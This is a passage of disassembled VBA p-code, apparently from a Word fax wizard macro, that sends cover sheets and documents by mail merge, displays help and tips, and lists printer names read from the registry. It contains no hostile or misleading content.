\n' Line #2025:\n' \tQuoteRem 0x0004 0x0022 \"if Fax not installed error message\"\n' Line #2026:\n' \tLineCont 0x0004 05 00 08 00\n' \tLd i \n' \tLd iERR_FAX_NOT_INSTALLED \n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tLd strErrorMsg \n' \tLd vbCr \n' \tConcat \n' \tLd strHLP_FAX_INSTALL \n' \tConcat \n' \tSt strErrorMsg \n' \tEndIf \n' Line #2027:\n' \tLd strErrorMsg \n' \tArgsCall DisplayTip 0x0001 \n' Line #2028:\n' \tQuoteRem 0x0000 0x001C \"reset printer for non MS fax\"\n' Line #2029:\n' \tLd fMSFax \n' \tIfBlock \n' Line #2030:\n' \tLd fSendMailAttach \n' \tLd Application \n' \tMemLd Options \n' \tMemSt SendMailAttach \n' Line #2031:\n' \tElseBlock \n' Line #2032:\n' \tLd strActivePrinter \n' \tLd Application \n' \tMemSt ActivePrinter \n' Line #2033:\n' \tEndIfBlock \n' Line #2034:\n' Line #2035:\n' \tLd i \n' \tLd iERR_FAX_NOT_INSTALLED \n' \tEq \n' \tIfBlock \n' Line #2036:\n' \tLd strWIN_HELP_FILE \n' \tLd lCNTXT_FAX_INSTALL \n' \tArgsCall DisplayHelp 0x0002 \n' Line #2037:\n' \tLd i \n' \tLd iERR_FAX_NOT_SENT \n' \tEq \n' \tLd fMSFax \n' \tAnd \n' \tElseIfBlock \n' Line #2038:\n' \tLd strFAX_HELP_FILE \n' \tLd lCNTXT_FAX_SEND \n' \tArgsCall DisplayHelp 0x0002 \n' Line #2039:\n' \tEndIfBlock \n' Line #2040:\n' \tEndSub \n' Line #2041:\n' \tQuoteRem 0x0000 0x004B \"Cover sheet is deleted after faxing if no cover sheet is opted by user. So,\"\n' Line #2042:\n' \tQuoteRem 0x0000 0x0026 \"Activedocument is new cover sheet doc.\"\n' Line #2043:\n' \tFuncDefn (Private Sub FaxFormLtr())\n' Line #2044:\n' Line #2045:\n' \tDim \n' \tVarDefn fMSFax (As Boolean)\n' Line #2046:\n' \tDim \n' \tVarDefn fCovSht (As Boolean)\n' Line #2047:\n' \tDim \n' \tVarDefn i (As Integer)\n' Line #2048:\n' \tDim \n' \tVarDefn strDocName (As String)\n' Line #2049:\n' \tDim \n' \tVarDefn iDestination (As Long)\n' Line #2050:\n' \tDim \n' \tVarDefn objVars (As Variables)\n' Line #2051:\n' \tDim \n' \tVarDefn fMainDocPresent (As Integer)\n' Line #2052:\n' \tDim \n' \tVarDefn strErrorMsg (As String)\n' Line #2053:\n' \tDim \n' \tVarDefn strFaxPrinter (As String)\n' \tVarDefn strActivePrinter (As String)\n' Line #2054:\n' \tDim \n' \tVarDefn objTmpMM (As MailMerge)\n' \tVarDefn strFaxFld (As String)\n' Line #2055:\n' Line #2056:\n' \tOnError FatalError \n' Line #2057:\n' Line #2058:\n' \tLd strERR_SEND_FAX \n' \tSt strErrorMsg \n' Line #2059:\n' \tSetStmt \n' \tLd ActiveDocument \n' \tMemLd Variables \n' \tSet objVars \n' Line #2060:\n' Line #2061:\n' \tLitStr 0x0013 \"Cover Sheet Present\"\n' \tArgsLd objVars 0x0001 \n' \tMemLd Value \n' \tArgsLd Val 0x0001 \n' \tSt fCovSht \n' Line #2062:\n' \tLitStr 0x000E \"MS Fax Present\"\n' \tArgsLd objVars 0x0001 \n' \tMemLd Value \n' \tArgsLd Val 0x0001 \n' \tSt fMSFax \n' Line #2063:\n' \tLitStr 0x0010 \"Main Doc Present\"\n' \tArgsLd objVars 0x0001 \n' \tMemLd Value \n' \tArgsLd Val 0x0001 \n' \tSt fMainDocPresent \n' Line #2064:\n' \tLitStr 0x000E \"Fax Field Name\"\n' \tArgsLd objVars 0x0001 \n' \tMemLd Value \n' \tSt strFaxFld \n' Line #2065:\n' Line #2066:\n' \tLd fMainDocPresent \n' \tIfBlock \n' Line #2067:\n' \tQuoteRem 0x0008 0x001E \"obtain handle to main document\"\n' Line #2068:\n' \tLitStr 0x0012 \"Main Document Name\"\n' \tArgsLd objVars 0x0001 \n' \tMemLd Value \n' \tSt strDocName \n' Line #2069:\n' \tLd objMainDoc \n' \tLd strDocName \n' \tArgsLd FInvalidMainDoc 0x0002 \n' \tIf \n' \tBoSImplicit \n' \tExitSub \n' \tEndIf \n' Line #2070:\n' \tQuoteRem 0x0008 0x0032 \"Set objMainDoc = Application.Documents(strDocName)\"\n' Line #2071:\n' \tEndIfBlock \n' Line #2072:\n' Line #2073:\n' \tLd fMSFax \n' \tIfBlock \n' Line #2074:\n' \tLitStr 0x000D \"Through Email\"\n' \tArgsLd objVars 0x0001 \n' \tMemLd Value \n' \tArgsLd Val 0x0001 \n' \tIfBlock \n' Line #2075:\n' \tLd wdSendToEmail \n' \tSt iDestination \n' Line #2076:\n' \tElseBlock \n' Line #2077:\n' \tLd wdSendToFax \n' \tSt iDestination \n' Line #2078:\n' \tEndIfBlock \n' Line #2079:\n' \tElseBlock \n' Line #2080:\n' \tLd wdSendToPrinter \n' \tSt iDestination \n' Line #2081:\n' \tQuoteRem 0x0008 0x003E \"if nonMSFax, then set the Fax driver to be the current printer\"\n' Line #2082:\n' \tLd Application \n' \tMemLd ActivePrinter \n' \tSt strActivePrinter \n' Line #2083:\n' \tLitStr 0x000B \"Fax Printer\"\n' \tArgsLd objVars 0x0001 \n' \tMemLd Value \n' \tSt strFaxPrinter \n' Line #2084:\n' \tLd strFaxPrinter \n' \tFnLen \n' \tLitDI2 0x0000 \n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tLitStr 0x0001 \" \"\n' \tSt strFaxPrinter \n' \tEndIf \n' Line #2085:\n' \tLd strFaxPrinter \n' \tLd Application \n' \tMemSt ActivePrinter \n' Line #2086:\n' \tEndIfBlock \n' Line #2087:\n' Line #2088:\n' \tQuoteRem 0x0004 0x0019 \"send the coversheet first\"\n' Line #2089:\n' \tLd fCovSht \n' \tParen \n' \tIfBlock \n' Line #2090:\n' \tSetStmt \n' \tLd ActiveDocument \n' \tMemLd MailMerge \n' \tSet objTmpMM \n' Line #2091:\n' \tLd iDestination \n' \tLd objTmpMM \n' \tMemSt Destination \n' \tQuoteRem 0x002C 0x002B \"MsgBox \"MailMerging activdoc (coversheet) \"\"\n' Line #2092:\n' \tLd strFaxFld \n' \tLd objTmpMM \n' \tMemSt MailAddressFieldName \n' Line #2093:\n' \tLitVarSpecial (True)\n' \tLd objTmpMM \n' \tMemSt MailAsAttachment \n' Line #2094:\n' \tLd strFAXING_CS_RECIPIENTS \n' \tSt StatusBar \n' Line #2095:\n' \tLd objTmpMM \n' \tArgsMemCall Execute 0x0000 \n' Line #2096:\n' \tEndIfBlock \n' Line #2097:\n' Line #2098:\n' \tLd fMainDocPresent \n' \tLitDI2 0x0000 \n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tGoTo LResetPrinter \n' \tEndIf \n' Line #2099:\n' Line #2100:\n' \tQuoteRem 0x0004 0x0015 \"fax the main document\"\n' Line #2101:\n' \tSetStmt \n' \tLd objMainDoc \n' \tMemLd MailMerge \n' \tSet objTmpMM \n' Line #2102:\n' \tLd iDestination \n' \tLd objTmpMM \n' \tMemSt Destination \n' Line #2103:\n' \tLd strFaxFld \n' \tLd objTmpMM \n' \tMemSt MailAddressFieldName \n' Line #2104:\n' \tLitVarSpecial (True)\n' \tLd objTmpMM \n' \tMemSt MailAsAttachment \n' Line #2105:\n' \tLd strFAXING_DOC_RECIPIENTS \n' \tSt StatusBar \n' Line #2106:\n' \tLd objTmpMM \n' \tArgsMemCall Execute 0x0000 \n' Line #2107:\n' \tQuoteRem 0x0004 0x001E \"MsgBox \"MailMerging main doc.\"\"\n' Line #2108:\n' Line #2109:\n' \tLabel LResetPrinter \n' Line #2110:\n' \tQuoteRem 0x0000 0x001C \"reset printer for non MS fax\"\n' Line #2111:\n' \tLd ActiveDocument \n' \tMemLd Fields \n' \tArgsMemCall Update 0x0000 \n' Line #2112:\n' \tLd fMSFax \n' \tParen \n' \tNot \n' \tParen \n' \tIf \n' \tBoSImplicit \n' \tLd strActivePrinter \n' \tLd Application \n' \tMemSt ActivePrinter \n' \tEndIf \n' Line #2113:\n' \tLd strMSG_FAX_SUCCESS \n' \tLitVarSpecial (True)\n' \tArgsCall DisplayPostWizTip 0x0002 \n' Line #2114:\n' \tQuoteRem 0x0004 0x001D \"DeleteCmdBar strCMD_BAR_TITLE\"\n' Line #2115:\n' \tExitSub \n' Line #2116:\n' Line #2117:\n' \tLabel FatalError \n' Line #2118:\n' \tLd Err \n' \tMemLd Number \n' \tSt i \n' Line #2119:\n' \tLd i \n' \tIf \n' \tBoSImplicit \n' \tLd strErrorMsg \n' \tLd vbCr \n' \tConcat \n' \tLd Err \n' \tMemLd Description \n' \tConcat \n' \tSt strErrorMsg \n' \tEndIf \n' Line #2120:\n' \tQuoteRem 0x0004 0x0022 \"if Fax not installed error message\"\n' Line #2121:\n' \tLineCont 0x0004 05 00 08 00\n' \tLd i \n' \tLd iERR_FAX_NOT_INSTALLED \n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tLd strErrorMsg \n' \tLd vbCr \n' \tConcat \n' \tLd strHLP_FAX_INSTALL \n' \tConcat \n' \tSt strErrorMsg \n' \tEndIf \n' Line #2122:\n' Line #2123:\n' \tLd strErrorMsg \n' \tArgsCall DisplayTip 0x0001 \n' Line #2124:\n' Line #2125:\n' \tQuoteRem 0x0000 0x001C \"reset printer for non MS fax\"\n' Line #2126:\n' \tLd fMSFax \n' \tParen \n' \tNot \n' \tParen \n' \tIf \n' \tBoSImplicit \n' \tLd strActivePrinter \n' \tLd Application \n' \tMemSt ActivePrinter \n' \tEndIf \n' Line #2127:\n' Line #2128:\n' \tLd i \n' \tLd iERR_FAX_NOT_INSTALLED \n' \tEq \n' \tIfBlock \n' Line #2129:\n' \tLd strWIN_HELP_FILE \n' \tLd lCNTXT_FAX_INSTALL \n' \tArgsCall DisplayHelp 0x0002 \n' Line #2130:\n' \tLd i \n' \tLd iERR_FAX_NOT_SENT \n' \tEq \n' \tLd fMSFax \n' \tAnd \n' \tElseIfBlock \n' Line #2131:\n' \tLd strFAX_HELP_FILE \n' \tLd lCNTXT_FAX_SEND \n' \tArgsCall DisplayHelp 0x0002 \n' Line #2132:\n' \tEndIfBlock \n' Line #2133:\n' \tEndSub \n' Line #2134:\n' Line #2135:\n' \tQuoteRem 0x0000 0x004D \"To display help using help files. Assuming that the help files are present in\"\n' Line #2136:\n' \tQuoteRem 0x0000 0x0015 \"the windows directory\"\n' Line #2137:\n' \tFuncDefn (Private Sub DisplayHelp(strFile As String, ByVal lContext As Long))\n' Line #2138:\n' \tDim \n' \tVarDefn iSize (As Integer)\n' Line #2139:\n' \tDim \n' \tVarDefn strTmpBuffer (As String)\n' Line #2140:\n' \tDim \n' \tVarDefn j (As Integer)\n' \tVarDefn i (As Integer)\n' Line #2141:\n' \tDim \n' \tVarDefn strWinDir (As String)\n' \tVarDefn strWndName (As String)\n' Line #2142:\n' \tDim \n' \tVarDefn hOpusWin (As Long)\n' \tVarDefn lResult (As Long)\n' Line #2143:\n' \tDim \n' \tVarDefn strMacroName (As String)\n' Line #2144:\n' Line #2145:\n' \tQuoteRem 0x0004 0x0015 \"Get windows directory\"\n' Line #2146:\n' \tLitDI2 0x0200 \n' \tSt i \n' Line #2147:\n' \tLd i \n' \tLitDI2 0x0000 \n' \tArgsLd String$$ 0x0002 \n' \tSt strTmpBuffer \n' Line #2148:\n' \tLitDI2 0x0000 \n' \tSt j \n' Line #2149:\n' \tLitStr 0x0000 \"\"\n' \tSt strWinDir \n' Line #2150:\n' \tLd strTmpBuffer \n' \tLd i \n' \tArgsLd GetWindowsDirectory 0x0002 \n' \tSt j \n' Line #2151:\n' Line #2152:\n' \tLd j \n' \tIfBlock \n' Line #2153:\n' \tLd j \n' \tLd i \n' \tGt \n' \tParen \n' \tIf \n' \tBoSImplicit \n' \tLd i \n' \tSt j \n' \tEndIf \n' Line #2154:\n' Line #2155:\n' \tLd strTmpBuffer \n' \tLd j \n' \tArgsLd LBound$ 0x0002 \n' \tSt strWinDir \n' Line #2156:\n' \tLineCont 0x0004 0A 00 0C 00\n' \tLd strWinDir \n' \tLitDI2 0x0001 \n' \tArgsLd Right$ 0x0002 \n' \tLd strPathSeparator \n' \tNe \n' \tIf \n' \tBoSImplicit \n' \tLd strWinDir \n' \tLd strPathSeparator \n' \tConcat \n' \tSt strWinDir \n' \tEndIf \n' Line #2157:\n' \tEndIfBlock \n' Line #2158:\n' Line #2159:\n' \tQuoteRem 0x0004 0x0012 \"Find word's window\"\n' Line #2160:\n' \tLd strMS_WORD \n' \tSt strWndName \n' Line #2161:\n' \tLineCont 0x0004 07 00 08 00\n' \tLd ActiveWindow \n' \tMemLd WindowState \n' \tLd wdWindowStateMaximize \n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tLd strWndName \n' \tLitStr 0x0003 \" - \"\n' \tConcat \n' \tLd ActiveWindow \n' \tMemLd Caption \n' \tConcat \n' \tSt strWndName \n' \tEndIf \n' Line #2162:\n' \tLitStr 0x0007 \"OpusApp\"\n' \tLd strWndName \n' \tArgsLd FindWindow 0x0002 \n' \tSt hOpusWin \n' Line #2163:\n' \tLd hOpusWin \n' \tLitDI2 0x0000 \n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tGoTo LNotFindWindow \n' \tEndIf \n' Line #2164:\n' Line #2165:\n' \tQuoteRem 0x0004 0x000C \"display help\"\n' Line #2166:\n' \tLitStr 0x0003 \"JH(\"\n' \tLd strQUOTE \n' \tConcat \n' \tLd strQUOTE \n' \tConcat \n' \tLitStr 0x0003 \" , \"\n' \tConcat \n' \tLd lContext \n' \tConcat \n' \tLitStr 0x0001 \")\"\n' \tConcat \n' \tSt strMacroName \n' Line #2167:\n' \tLd hOpusWin \n' \tLd strWinDir \n' \tLd strFile \n' \tConcat \n' \tLd HELP_COMMAND \n' \tLd strMacroName \n' \tArgsLd WinHelp 0x0004 \n' \tSt lResult \n' Line #2168:\n' Line #2169:\n' \tLabel LNotFindWindow \n' Line #2170:\n' \tEndSub \n' Line #2171:\n' \tQuoteRem 0x0000 0x0029 \"displays a tip during post-wizard options\"\n' Line #2172:\n' \tQuoteRem 0x0000 0x004D \"assumes that Assistant is present since it is called from post-wizard balloon\"\n' Line #2173:\n' \tFuncDefn (Private Sub DisplayTip(strTip As String))\n' Line #2174:\n' \tDim \n' \tVarDefn objBlnTip (As Balloon)\n' Line #2175:\n' \tOnError FatalError \n' Line #2176:\n' Line #2177:\n' \tSetStmt \n' \tLd Assistant \n' \tMemLd NewBalloon \n' \tSet objBlnTip \n' Line #2178:\n' Line #2179:\n' \tStartWithExpr \n' \tLd objBlnTip \n' \tWith \n' Line #2180:\n' \tLd msoModeModal \n' \tMemStWith Mode \n' Line #2181:\n' \tLd strWizName \n' \tMemStWith Heading \n' Line #2182:\n' \tLd strTip \n' \tMemStWith Then \n' Line #2183:\n' \tLd msoButtonSetOK \n' \tMemStWith Button \n' Line #2184:\n' \tEndWith \n' Line #2185:\n' \tLd objBlnTip \n' \tArgsMemCall Show 0x0000 \n' Line #2186:\n' Line #2187:\n' \tLd Assistant \n' \tMemLd BalloonError \n' \tLd msoBalloonErrorNone \n' \tNe \n' \tIf \n' \tBoSImplicit \n' \tGoTo FatalError \n' \tEndIf \n' Line #2188:\n' Line #2189:\n' \tExitSub \n' Line #2190:\n' Line #2191:\n' \tLabel FatalError \n' Line #2192:\n' \tLd Err \n' \tArgsMemCall Clear 0x0000 \n' Line #2193:\n' \tQuoteRem 0x0004 0x0038 \"MsgBox strTip, vbOKOnly + vbApplicationModal, strWizName\"\n' Line #2194:\n' \tEndSub \n' Line #2195:\n' \tQuoteRem 0x0000 0x0029 \"ROUTINES TO OBTAIN PRINTERS FROM REGISTRY\"\n' Line #2196:\n' \tQuoteRem 0x0000 0x0048 \"fills rgstrPrinterNames with the local and remote printer names obtained\"\n' Line #2197:\n' \tQuoteRem 0x0000 0x003E \"from the registry. iTotalNumPrinters has the number of printer\"\n' Line #2198:\n' \tQuoteRem 0x0000 0x000F \"names obtained.\"\n' Line #2199:\n' \tFuncDefn (Sub GetAllPrinters())\n' Line #2200:\n' \tDim \n' \tVarDefn i (As Integer)\n' Line #2201:\n' Line #2202:\n' \tLitDI2 0x0000 \n' \tSt iTotalNumPrinters \n' Line #2203:\n' Line #2204:\n' \tArgsCall GetLocalPrinters 0x0000 \n' Line #2205:\n' \tArgsCall GetRemotePrinters 0x0000 \n' Line #2206:\n' Line #2207:\n' \tLd iTotalNumPrinters \n' \tLitDI2 0x0000 \n' \tGt \n' \tParen \n' \tIfBlock \n' Line #2208:\n' \tOptionBase \n' \tLd iTotalNumPrinters \n' \tLitDI2 0x0001 \n' \tSub \n' \tRedim (Preserve) rgstrPrinterNames 0x0001 (As Variant)\n' Line #2209:\n' \tLd rgstrPrinterNames \n' \tLd formWizard \n' \tMemLd cboFaxDriver \n' \tMemSt List \n' Line #2210:\n' \tLitDI2 0x0000 \n' \tLd formWizard \n' \tMemLd cboFaxDriver \n' \tMemSt ListIndex \n' Line #2211:\n' \tEndIfBlock \n' Line #2212:\n' \tQuoteRem 0x0004 0x0044 \"if no printers, then the user can use cmdOtherPrinters to select one\"\n' Line #2213:\n' \tQuoteRem 0x0004 0x0026 \"if we failed to enumerate some printer\"\n' Line #2214:\n' Line #2215:\n' \tEndSub \n' Line #2216:\n' \tFuncDefn (Sub GetRemotePrinters())\n' Line #2217:\n' \tDim \n' \tVarDefn hr (As Long)\n' Line #2218:\n' \tDim \n' \tVarDefn hSubKey (As Long)\n' Line #2219:\n' Line #2220:\n' \tLd HKEY_LOCAL_MACHINE \n' \tLd strREG_PROVIDERS \n' \tLd hSubKey \n' \tArgsLd RegOpenKey 0x0003 \n' \tSt hr \n' Line #2221:\n' \tLd hr \n' \tLd ERROR_SUCCESS \n' \tNe \n' \tIf \n' \tBoSImplicit \n' \tExitSub \n' \tEndIf \n' Line #2222:\n' Line #2223:\n' \tLd hSubKey \n' \tParen \n' \tArgsCall GetRemotePrinterNames 0x0001 \n' Line #2224:\n' Line #2225:\n' \tLd hSubKey \n' \tParen \n' \tArgsCall RegCloseKey 0x0001 \n' Line #2226:\n' Line #2227:\n' \tEndSub \n' Line #2228:\n' Line #2229:\n' \tFuncDefn (Sub GetProviderPrinters(strProvider As String))\n' Line #2230:\n' \tDim \n' \tVarDefn hr (As Long)\n' Line #2231:\n' \tDim \n' \tVarDefn hKeyProviderServers (As Long)\n' Line #2232:\n' \tDim \n' \tVarDefn lpPrinterServer (As String)\n' \tVarDefn strPrinterServer (As String)\n' Line #2233:\n' \tDim \n' \tVarDefn cbPrinterServer (As Long)\n' Line #2234:\n' \tDim \n' \tVarDefn dwPrinterIndex (As Long)\n' Line #2235:\n' \tDim \n' \tVarDefn lRet (As Long)\n' \tVarDefn iLenPrinterServer (As Integer)\n' Line #2236:\n' Line #2237:\n' \tLitDI2 0x0100 \n' \tSt cbPrinterServer \n' Line #2238:\n' \tLd cbPrinterServer \n' \tLitDI2 0x0000 \n' \tArgsLd String$$ 0x0002 \n' \tSt lpPrinterServer \n' Line #2239:\n' \tLitDI2 0x0000 \n' \tSt dwPrinterIndex \n' Line #2240:\n' Line #2241:\n' Line #2242:\n' \tLd HKEY_LOCAL_MACHINE \n' \tLd strREG_PROVIDERS \n' \tLd strProvider \n' \tConcat \n' \tLitStr 0x0008 \"\\Servers\"\n' \tConcat \n' \tLd hKeyProviderServers \n' \tArgsLd RegOpenKey 0x0003 \n' \tSt hr \n' Line #2243:\n' Line #2244:\n' \tLd hr \n' \tLd ERROR_SUCCESS \n' \tNe \n' \tIf \n' \tBoSImplicit \n' \tGoTo LEndGetProviderPrinters \n' \tEndIf \n' Line #2245:\n' Line #2246:\n' \tLd ERROR_SUCCESS \n' \tSt lRet \n' Line #2247:\n' \tLd lRet \n' \tLd ERROR_SUCCESS \n' \tEq \n' \tParen \n' \tWhile \n' Line #2248:\n' \tLd cbPrinterServer \n' \tLitDI2 0x0000 \n' \tArgsLd String$$ 0x0002 \n' \tSt lpPrinterServer \n' Line #2249:\n' Line #2250:\n' \tLd hKeyProviderServers \n' \tLd dwPrinterIndex \n' \tLd lpPrinterServer \n' \tLd cbPrinterServer \n' \tArgsLd RegEnumKey 0x0004 \n' \tSt hr \n' Line #2251:\n' Line #2252:\n' \tLd hr \n' \tLd ERROR_SUCCESS \n' \tNe \n' \tIf \n' \tBoSImplicit \n' \tGoTo LCloseProviderServersKey \n' \tEndIf \n' Line #2253:\n' Line #2254:\n' \tLd lpPrinterServer \n' \tLitDI2 0x0000 \n' \tArgsLd Chr$ 0x0001 \n' \tFnInStr \n' \tSt iLenPrinterServer \n' Line #2255:\n' \tLd iLenPrinterServer \n' \tLitDI2 0x0001 \n' \tGt \n' \tParen \n' \tIfBlock \n' \tQuoteRem 0x0028 0x0007 \"no name\"\n' Line #2256:\n' \tLd lpPrinterServer \n' \tLd iLenPrinterServer \n' \tLitDI2 0x0001 \n' \tSub \n' \tArgsLd LBound$ 0x0002 \n' \tSt strPrinterServer \n' Line #2257:\n' \tLd strProvider \n' \tLd strPrinterServer \n' \tArgsCall GetPrinterNamesFromServer 0x0002 \n' Line #2258:\n' \tEndIfBlock \n' Line #2259:\n' Line #2260:\n' \tLd dwPrinterIndex \n' \tLitDI2 0x0001 \n' \tAdd \n' \tSt dwPrinterIndex \n' Line #2261:\n' \tWend \n' Line #2262:\n' Line #2263:\n' \tLabel LCloseProviderServersKey \n' Line #2264:\n' \tLd hKeyProviderServers \n' \tParen \n' \tArgsCall RegCloseKey 0x0001 \n' Line #2265:\n' Line #2266:\n' \tLabel LEndGetProviderPrinters \n' Line #2267:\n' \tEndSub \n' Line #2268:\n' Line #2269:\n' \tFuncDefn (Sub GetPrinterNamesFromServer(strProvider As String, strPrinterServer As String))\n' Line #2270:\n' \tDim \n' \tVarDefn hr (As Long)\n' Line #2271:\n' \tDim \n' \tVarDefn hKeyPrinterServers (As Long)\n' Line #2272:\n' \tDim \n' \tVarDefn lpPrinterName (As String)\n' \tVarDefn strPrinterName (As String)\n' Line #2273:\n' \tDim \n' \tVarDefn strPrinter (As String)\n' Line #2274:\n' \tDim \n' \tVarDefn cbPrinterName (As Long)\n' Line #2275:\n' \tDim \n' \tVarDefn dwPrinterIndex (As Long)\n' Line #2276:\n' \tDim \n' \tVarDefn lRet (As Long)\n' \tVarDefn iLenPrinterName (As Integer)\n' Line #2277:\n' \tDim \n' \tVarDefn strRegPrinterServers (As String)\n' Line #2278:\n' Line #2279:\n' Line #2280:\n' \tLitDI2 0x0100 \n' \tSt cbPrinterName \n' Line #2281:\n' \tLd cbPrinterName \n' \tLitDI2 0x0000 \n' \tArgsLd String$$ 0x0002 \n' \tSt lpPrinterName \n' Line #2282:\n' \tLitDI2 0x0000 \n' \tSt dwPrinterIndex \n' Line #2283:\n' Line #2284:\n' \tOnError (Resume Next) \n' Line #2285:\n' \tLd strREG_PROVIDERS \n' \tLd strProvider \n' \tConcat \n' \tLitStr 0x0009 \"\\Servers\\\"\n' \tConcat \n' \tLd strPrinterServer \n' \tConcat \n' \tLitStr 0x0009 \"\\Printers\"\n' \tConcat \n' \tSt strRegPrinterServers \n' Line #2286:\n' \tLd HKEY_LOCAL_MACHINE \n' \tLd strRegPrinterServers \n' \tLd hKeyPrinterServers \n' \tArgsLd RegOpenKey 0x0003 \n' \tSt hr \n' Line #2287:\n' Line #2288:\n' \tLd hr \n' \tLd ERROR_SUCCESS \n' \tNe \n' \tIf \n' \tBoSImplicit \n' \tGoTo LEndGetProviderPrinters \n' \tEndIf \n' Line #2289:\n' Line #2290:\n' \tLd ERROR_SUCCESS \n' \tSt lRet \n' Line #2291:\n' \tLd lRet \n' \tLd ERROR_SUCCESS \n' \tEq \n' \tParen \n' \tWhile \n' Line #2292:\n' \tLd cbPrinterName \n' \tLitDI2 0x0000 \n' \tArgsLd String$$ 0x0002 \n' \tSt lpPrinterName \n' Line #2293:\n' Line #2294:\n' \tLd hKeyPrinterServers \n' \tLd dwPrinterIndex \n' \tLd lpPrinterName \n' \tLd cbPrinterName \n' \tArgsLd RegEnumKey 0x0004 \n' \tSt lRet \n' Line #2295:\n' Line #2296:\n' \tLd lRet \n' \tLd ERROR_SUCCESS \n' \tNe \n' \tIf \n' \tBoSImplicit \n' \tGoTo LClosePrinterServersKey \n' \tEndIf \n' Line #2297:\n' Line #2298:\n' \tLd lpPrinterName \n' \tLitDI2 0x0000 \n' \tArgsLd Chr$ 0x0001 \n' \tFnInStr \n' \tSt iLenPrinterName \n' Line #2299:\n' \tLd iLenPrinterName \n' \tLitDI2 0x0001 \n' \tGt \n' \tParen \n' \tIfBlock \n' \tQuoteRem 0x0026 0x0007 \"no name\"\n' Line #2300:\n' \tLd lpPrinterName \n' \tLd iLenPrinterName \n' \tLitDI2 0x0001 \n' \tSub \n' \tArgsLd LBound$ 0x0002 \n' \tSt strPrinter \n' Line #2301:\n' \tLitStr 0x0000 \"\"\n' \tSt strPrinterName \n' Line #2302:\n' \tLitStr 0x0000 \"\"\n' \tLitStr 0x0013 \"HKEY_LOCAL_MACHINE\\\"\n' \tLd strRegPrinterServers \n' \tConcat \n' \tLitStr 0x0001 \"\\\"\n' \tConcat \n' \tLd strPrinter \n' \tConcat \n' \tLitStr 0x0004 \"Name\"\n' \tLd System \n' \tArgsMemLd PrivateProfileString 0x0003 \n' \tSt strPrinterName \n' Line #2303:\n' Line #2304:\n' \tLd strPrinterName \n' \tFnLen \n' \tLitDI2 0x0000 \n' \tNe \n' \tIfBlock \n' Line #2305:\n' \tLineCont 0x0004 09 00 14 00\n' \tLd iTotalNumPrinters \n' \tLitDI2 0x000A \n' \tMod \n' \tParen \n' \tLitDI2 0x0000 \n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tOptionBase \n' \tLd iTotalNumPrinters \n' \tLitDI2 0x000A \n' \tAdd \n' \tRedim (Preserve) rgstrPrinterNames 0x0001 (As Variant)\n' \tEndIf \n' Line #2306:\n' \tLitStr 0x0002 \"\\\\\"\n' \tLd strPrinterServer \n' \tConcat \n' \tLitStr 0x0001 \"\\\"\n' \tConcat \n' \tLd strPrinterName \n' \tConcat \n' \tArgsLd UCase$ 0x0001 \n' \tLd iTotalNumPrinters \n' \tArgsSt rgstrPrinterNames 0x0001 \n' Line #2307:\n' \tLd iTotalNumPrinters \n' \tLitDI2 0x0001 \n' \tAdd \n' \tSt iTotalNumPrinters \n' Line #2308:\n' \tEndIfBlock \n' Line #2309:\n' \tEndIfBlock \n' Line #2310:\n' Line #2311:\n' \tLd dwPrinterIndex \n' \tLitDI2 0x0001 \n' \tAdd \n' \tSt dwPrinterIndex \n' Line #2312:\n' \tWend \n' Line #2313:\n' Line #2314:\n' \tLabel LClosePrinterServersKey \n' Line #2315:\n' \tLd hKeyPrinterServers \n' \tParen \n' \tArgsCall RegCloseKey 0x0001 \n' Line #2316:\n' Line #2317:\n' \tLabel LEndGetProviderPrinters \n' Line #2318:\n' Line #2319:\n' \tEndSub \n' Line #2320:\n' Line #2321:\n' \tFuncDefn (Sub GetRemotePrinterNames(hKey As Long))\n' Line #2322:\n' \tDim \n' \tVarDefn dwProviderIndex (As Long)\n' Line #2323:\n' \tDim \n' \tVarDefn cbProviderName (As Long)\n' Line #2324:\n' \tDim \n' \tVarDefn lpProviderName (As String)\n' Line #2325:\n' \tDim \n' \tVarDefn lRet (As Long)\n' \tVarDefn iLenProviderName (As Integer) 0x0028\n' Line #2326:\n' Line #2327:\n' \tDim \n' \tVarDefn strProviderName (As String)\n' Line #2328:\n' Line #2329:\n' \tLitDI2 0x0100 \n' \tSt cbProviderName \n' Line #2330:\n' \tLitDI2 0x0000 \n' \tSt dwProviderIndex \n' Line #2331:\n' Line #2332:\n' \tLd ERROR_SUCCESS \n' \tSt lRet \n' Line #2333:\n' Line #2334:\n' \tQuoteRem 0x0004 0x0048 \"get the list of providers and call GetProviderPrinters for each provider\"\n' Line #2335:\n' \tLd lRet \n' \tLd ERROR_SUCCESS \n' \tEq \n' \tParen \n' \tWhile \n' Line #2336:\n' \tLd cbProviderName \n' \tLitDI2 0x0000 \n' \tArgsLd String$$ 0x0002 \n' \tSt lpProviderName \n' Line #2337:\n' Line #2338:\n' \tLd hKey \n' \tLd dwProviderIndex \n' \tLd lpProviderName \n' \tLd cbProviderName \n' \tArgsLd RegEnumKey 0x0004 \n' \tSt lRet \n' Line #2339:\n' Line #2340:\n' \tLd lRet \n' \tLd ERROR_SUCCESS \n' \tNe \n' \tParen \n' \tIf \n' \tBoSImplicit \n' \tGoTo LEnd \n' \tEndIf \n' Line #2341:\n' Line #2342:\n' \tLd lpProviderName \n' \tLitDI2 0x0000 \n' \tArgsLd Chr$ 0x0001 \n' \tFnInStr \n' \tSt iLenProviderName \n' \tQuoteRem 0x003A 0x0017 \"length of provider name\"\n' Line #2343:\n' Line #2344:\n' \tLd iLenProviderName \n' \tLitDI2 0x0001 \n' \tGt \n' \tParen \n' \tIfBlock \n' Line #2345:\n' \tLd lpProviderName \n' \tLd iLenProviderName \n' \tLitDI2 0x0001 \n' \tSub \n' \tArgsLd LBound$ 0x0002 \n' \tSt strProviderName \n' Line #2346:\n' \tLd strProviderName \n' \tParen \n' \tArgsCall GetProviderPrinters 0x0001 \n' Line #2347:\n' \tEndIfBlock \n' Line #2348:\n' Line #2349:\n' \tLd dwProviderIndex \n' \tLitDI2 0x0001 \n' \tAdd \n' \tSt dwProviderIndex \n' Line #2350:\n' \tWend \n' Line #2351:\n' Line #2352:\n' \tLabel LEnd \n' Line #2353:\n' Line #2354:\n' \tEndSub \n' Line #2355:\n' Line #2356:\n' \tFuncDefn (Sub 